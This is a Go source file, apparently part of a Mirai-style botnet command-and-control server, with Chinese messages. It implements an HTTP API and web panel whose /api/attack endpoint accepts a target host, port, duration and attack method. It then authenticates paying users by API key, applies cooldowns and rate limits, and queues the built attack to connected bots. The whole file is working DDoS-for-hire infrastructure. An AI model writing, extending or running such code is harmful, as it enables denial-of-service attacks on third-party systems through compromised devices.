package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

type APIServer struct {
	port         int
	server       *http.Server
	rateLimiter  map[string][]time.Time
	userCooldown map[string]time.Time
	mutex        sync.RWMutex
	webPanel     *WebPanel
}

type APIResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message,omitempty"`
	Error   string `json:"error,omitempty"`
	Bots    int    `json:"bots,omitempty"`
	Method  string `json:"method,omitempty"`
	Target  string `json:"target,omitempty"`
	Port    int    `json:"port,omitempty"`
	Time    int    `json:"time,omitempty"`
}

func NewAPIServer(port int) *APIServer {
	return &APIServer{
		port:         port,
		rateLimiter:  make(map[string][]time.Time),
		userCooldown: make(map[string]time.Time),
		webPanel:     NewWebPanel(),
	}
}

func (s *APIServer) Start() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/attack", s.handleAttack)
	mux.HandleFunc("/api/status", s.handleStatus)
	mux.HandleFunc("/api/login", s.handleLogin)
	mux.HandleFunc("/api/bots", s.handleWebBots)
	mux.HandleFunc("/api/botlist", s.handleBotList)
	mux.HandleFunc("/api/history", s.handleWebHistory)
	mux.HandleFunc("/api/users", s.handleUsers)
	mux.HandleFunc("/api/users/create", s.handleUserCreate)
	mux.HandleFunc("/api/users/remove", s.handleUserRemove)
	mux.HandleFunc("/api/groups", s.handleGroups)
	mux.HandleFunc("/api/events", s.handleSSE)
	mux.HandleFunc("/", s.handleWebPanel)

	s.server = &http.Server{
		Addr:         fmt.Sprintf(":%d", s.port),
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	go func() {
		fmt.Printf("[api] 管理面板已启动: http://0.0.0.0:%d\n", s.port)
		if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[api] error: %v\n", err)
		}
	}()
}

func (s *APIServer) Stop() {
	if s.server != nil {
		s.server.Close()
	}
}

func (s *APIServer) writeJSON(w http.ResponseWriter, status int, resp APIResponse) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(resp)
}

func (s *APIServer) getClientIP(r *http.Request) string {
	xff := r.Header.Get("X-Forwarded-For")
	if xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	xri := r.Header.Get("X-Real-IP")
	if xri != "" {
		return xri
	}
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	return host
}

func (s *APIServer) checkRateLimit(ip string) bool {
	s.mutex.Lock()
	defer s.mutex.Unlock()

	now := time.Now()
	windowStart := now.Add(-time.Minute)

	requests := s.rateLimiter[ip]
	var validRequests []time.Time
	for _, t := range requests {
		if t.After(windowStart) {
			validRequests = append(validRequests, t)
		}
	}
	s.rateLimiter[ip] = validRequests

	limit := 30
	if appConfig.API.RateLimit > 0 {
		limit = appConfig.API.RateLimit
	}
	if len(validRequests) >= limit {
		return false
	}

	s.rateLimiter[ip] = append(s.rateLimiter[ip], now)
	return true
}

func (s *APIServer) checkCooldown(username string) (bool, int) {
	s.mutex.RLock()
	lastAttack, exists := s.userCooldown[username]
	s.mutex.RUnlock()

	if !exists {
		return true, 0
	}

	cooldownDuration := time.Duration(appConfig.API.Cooldown) * time.Second
	if cooldownDuration == 0 {
		cooldownDuration = 5 * time.Second
	}

	elapsed := time.Since(lastAttack)
	if elapsed < cooldownDuration {
		remaining := int((cooldownDuration - elapsed).Seconds())
		return false, remaining
	}

	return true, 0
}

func (s *APIServer) setCooldown(username string) {
	s.mutex.Lock()
	s.userCooldown[username] = time.Now()
	s.mutex.Unlock()
}

func (s *APIServer) isIPWhitelisted(ip string) bool {
	whitelist := appConfig.API.Whitelist
	if len(whitelist) == 0 {
		return true
	}

	for _, allowed := range whitelist {
		if allowed == ip {
			return true
		}
		if strings.Contains(allowed, "/") {
			_, cidr, err := net.ParseCIDR(allowed)
			if err == nil && cidr.Contains(net.ParseIP(ip)) {
				return true
			}
		}
	}
	return false
}

func (s *APIServer) isHostBlocked(host string) bool {
	targetIP := net.ParseIP(host)
	blockedHosts := appConfig.API.BlockedHosts

	for _, blocked := range blockedHosts {
		if blocked == host {
			return true
		}
		if strings.Contains(blocked, "/") {
			_, cidr, err := net.ParseCIDR(blocked)
			if err == nil && targetIP != nil && cidr.Contains(targetIP) {
				return true
			}
		}
	}
	return false
}

func (s *APIServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Message: "API运行中",
		Bots:    clientList.Count(),
	})
}

func (s *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
	clientIP := s.getClientIP(r)

	fmt.Printf("[api] 攻击请求: %s 来自 %s\n", r.URL.RawQuery, clientIP)

	if !s.isIPWhitelisted(clientIP) {
		fmt.Printf("[api] IP不在白名单: %s\n", clientIP)
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success: false,
			Error:   "访问被拒绝",
		})
		return
	}

	if !s.checkRateLimit(clientIP) {
		s.writeJSON(w, http.StatusTooManyRequests, APIResponse{
			Success: false,
			Error:   "请求过于频繁，请稍后再试",
		})
		return
	}

	query := r.URL.Query()
	username := query.Get("user")
	apiKey := query.Get("apikey")
	host := query.Get("host")
	portStr := query.Get("port")
	timeStr := query.Get("time")
	method := strings.ToLower(query.Get("method"))
	optionStr := query.Get("option")
	source := query.Get("source")

	// Support web panel token auth
	if username == "" && apiKey == "" {
		token := query.Get("token")
		if token == "" {
			token = r.Header.Get("X-Token")
		}
		if token != "" {
			if session, ok := s.webPanel.validateSession(token); ok {
				username = session.username
				apiKey = session.apiKey
			}
		}
	}

	if username == "" || apiKey == "" {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "缺少用户或API密钥参数",
		})
		return
	}

	if host == "" || method == "" || timeStr == "" {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "缺少必需参数: host, method, time",
		})
		return
	}

	if _, exists := attackInfoLookup[method]; !exists {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   fmt.Sprintf("无效的攻击方式: %s", method),
		})
		return
	}

	port := 0
	if portStr != "" {
		var err error
		port, err = strconv.Atoi(portStr)
		if err != nil || port < 0 || port > 65535 {
			s.writeJSON(w, http.StatusBadRequest, APIResponse{
				Success: false,
				Error:   "无效的端口 (0-65535)",
			})
			return
		}
	}

	duration, err := strconv.Atoi(timeStr)
	if err != nil || duration <= 0 {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "无效的持续时间",
		})
		return
	}

	accInfo, err := database.GetUserByAPIKey(username, apiKey)
	// If direct API key fails, try session token
	if accInfo == nil && apiKey != "" {
		if session, ok := s.webPanel.validateSession(apiKey); ok {
			accInfo, err = database.GetUserByAPIKey(session.username, session.apiKey)
			if err == nil && accInfo != nil {
				username = session.username
			}
		}
	}
	if err != nil {
		fmt.Printf("[api] 数据库错误 user=%s: %v\n", username, err)
		s.writeJSON(w, http.StatusInternalServerError, APIResponse{
			Success: false,
			Error:   "服务器内部错误",
		})
		return
	}

	if accInfo == nil {
		fmt.Printf("[api] 认证失败: user=%s ip=%s\n", username, clientIP)
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "用户名或API密钥无效",
		})
		return
	}

	canAttack, remaining := s.checkCooldown(username)
	if !canAttack {
		s.writeJSON(w, http.StatusTooManyRequests, APIResponse{
			Success: false,
			Error:   fmt.Sprintf("冷却中，请等待 %d 秒", remaining),
		})
		return
	}

	if s.isHostBlocked(host) {
		fmt.Printf("[api] 目标已被屏蔽: %s by user: %s\n", host, username)
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success: false,
			Error:   "目标主机已被屏蔽",
		})
		return
	}

	cmdStr := fmt.Sprintf("%s %s %d", method, host, duration)
	if port > 0 {
		cmdStr += fmt.Sprintf(" dport=%d", port)
	}

	if optionStr != "" {
		pairs := strings.Split(optionStr, "&")
		for _, pair := range pairs {
			kv := strings.SplitN(pair, "=", 2)
			if len(kv) == 2 {
				cmdStr += fmt.Sprintf(" %s=%s", kv[0], kv[1])
			}
		}
	}

	atk, err := NewAttack(cmdStr, 1)
	if err != nil {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   fmt.Sprintf("攻击构建失败: %s", err.Error()),
		})
		return
	}

	buf, err := atk.Build()
	if err != nil {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   fmt.Sprintf("攻击构建失败: %s", err.Error()),
		})
		return
	}

	botCount := accInfo.maxBots
	if botCount <= 0 {
		botCount = -1
	}
	clientList.QueueBuf(buf, botCount, source)

	s.setCooldown(username)

	fmt.Printf("[api] 攻击已发送: user=%s method=%s target=%s:%d time=%d source=%s\n",
		username, method, host, port, duration, source)

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Message: "攻击发送成功",
		Bots:    botCount,
		Method:  method,
		Target:  host,
		Port:    port,
		Time:    duration,
	})
}
